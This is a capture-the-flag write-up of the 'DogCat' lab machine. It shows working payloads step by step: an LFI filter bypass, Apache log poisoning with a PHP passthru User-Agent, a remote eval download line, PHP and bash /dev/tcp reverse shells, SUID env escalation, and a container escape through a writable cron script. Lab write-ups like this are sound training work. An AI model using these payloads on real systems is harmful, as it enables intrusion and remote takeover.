# DogCat


## Scans
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.112.106:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      313c http://10.10.112.106/dogs
301        9l       28w      313c http://10.10.112.106/cats
200       19l       37w      418c http://10.10.112.106/
```

## Eumeration

Website has two buttons, dog and cat.

View parameter gets file, required "dog" or "cat" in the name

Seems to also include .php extension?

We can use the dogs folder to bypass the filter and escape to other dirs

LFI by inputting this as a parameter:
```?view=php://filter/convert.base64-encode/resource=dogs/../index```

PHP code can be gotten by using the B64 PHP filter and requesting "index":
```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

Another parameter found, "ext" which is appended to the "view" parameter, defaults to .php

Apache's access log is viewable with the parameter:
```?view=dogs/../../../../var/log/apache2/access&ext=.log```

User agent is being logged, possible entry point

## Exploitation

Using Apache's access log (/var/log/apache2/access.log) we can inject PHP code into the log file and get it to run on the server

By using Burp, we can set the User-Agent string to PHP code and request an unknown page:
```
GET /AAAAA HTTP/1.1
Host: 10.10.88.65
User-Agent: <? passthru($_GET[cmd]) ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Now when we access the log it checks for a "cmd" parameter and attempts to run it in a shell

I then set up a MSF exploit/multi/script/web_delivery listener which gave code to download meterpreter

By sending this parameter, PHP connects to the listener and executes the shell
```?view=dogs/../../../../var/log/apache2/access&ext=.log&cmd=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://IP:8888/d7KISSBIYZQUc%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22```

We now have a shell!

## Privilege Escalation

From the meterpreter shell, I also connected a pwncat shell to mess around with that

Used the pentestmonkey PHP shell to connect:
```php -r '$sock=fsockopen("$LOCAL_IP",9998);exec("/bin/sh -i <&3 >&3 2>&3");'```

NOTHING WORKED, I tried for 30 minutes to get any other type of shell connected and it just wouldn't

Using meterpreter, I ran linpeas and found that /usr/bin/env has SUID set

Simple GTFObins search found the payload:
```./env /bin/bash -p```

And we have root!


## Container Escape

But wait, LinPEAS found that we are inside of a docker container

It also listed that the /opt/backups/backup.tar file was written to recently

Going into the /opt/backups directory there is a shell script "backup.sh"

Could the host machine be running this with a cron entry?

We can write to it, so appending a reverse shell wouldn't hurt:
```echo "bash -i >& /dev/tcp/$LOCAL_IP/9969 0>&1" >> /opt/backups/backup.sh```

Listining with pwncat gives us a shell after a couple of seconds!

We now have a root shell on the host machine!
